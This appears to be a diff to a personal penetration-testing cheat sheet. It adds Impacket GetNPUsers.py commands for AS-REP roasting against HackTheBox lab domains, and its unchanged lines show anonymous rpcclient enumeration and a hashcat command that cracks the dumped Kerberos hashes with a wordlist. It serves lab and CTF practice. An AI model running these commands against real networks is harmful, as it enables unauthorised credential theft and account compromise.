@@ -34,8 +34,14 @@ rpcclient -U "" -N 10.10.10.161
 # GetNPUsers.py
 ## anon
 GetNPUsers.py Egotistical-bank.local/ -dc-ip 10.10.10.175
-## with usernames
+GetNPUsers.py active.htb/ -dc-ip 10.10.10.100
+
+## with username
 GetNPUsers.py Egotistical-bank.local/fsmith -dc-ip 10.10.10.175 -request -no-pass
+
+## with username list
+GetNPUsers.py 'EGOTISTICAL-BANK.LOCAL/' -usersfile users.txt -format hashcat -outputfile hashes.aspreroast -dc-ip 10.10.10.175
+
 ## hashcat
 hashcat -m 18200 ./hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
 
